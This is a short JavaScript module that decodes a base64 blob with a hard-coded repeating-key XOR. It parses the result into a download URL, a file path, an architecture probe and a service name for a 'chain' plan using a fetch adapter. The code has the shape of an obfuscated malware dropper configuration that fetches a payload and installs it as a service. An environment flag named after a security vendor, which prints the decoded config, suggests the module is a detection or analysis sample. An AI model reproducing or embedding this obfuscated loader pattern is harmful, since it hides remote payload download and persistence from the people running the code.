  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_5bd88142 = "W91VQYFZhRROz12SC1ubQYU7VZ1elEhckVyVDU+XcpIBUJ1ZhUhKgESUAWKURIwBEZFFgQpal3KNC1mXAYQNToJMlAdVrV2SC16XXpMYXJZMkBBYgBCGAUmRRb8UUZNZhgtPn3KGBVGeT4EHVo5elAVal3KDC0icWd1RQZFMjRRcm0qOO1SWEK4rebcA0Fx/wBXVUwuOWJIIAJpZlBROyALPClKWSM1UBZAf2FEKxBXXU1vcSJgFUIJBhUpUnFuBCFSWAoEUVI5YkwFPrUyHAVOGEK4LWZdslQBUhgLQXF/AUYYNUZdykAVJmhDPEFCCAogRU4ZfhRdO30OPAFjdA5MQXJVIzVQFkB/YUQrEFddTW9xAihdBk1+DDGKCX48GWM9dkgtel16TSlyATogYTpdflg1el3KOBVCXEI4LWZcA0FxfwBXVSk6XX5YNXpc=";
  const Codec_5bd88142 = "base64_chunks|repeating_key_xor|2d,e0,64,3d,f2";

  function load_5bd88142() { return [...Buffer.from(Material_5bd88142, "base64")]; }
  function decode_5bd88142(v_a19c) { const keyBytes = [45,224,100,61,242]; return v_a19c.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
  async function recover_5bd88142() {
    const v_c304 = "";
    const v_a19c = load_5bd88142(); let v_b27e = [];
    switch (1) { case 1: v_b27e = decode_5bd88142(v_a19c); break; default: throw new Error("state"); }
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_5bd88142() { return await recover_5bd88142(); }
  async function plan_5bd88142() { const inspect = inspect_5bd88142; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "fetch_platform_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
  void moduleShape; void plan_5bd88142;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_5bd88142());
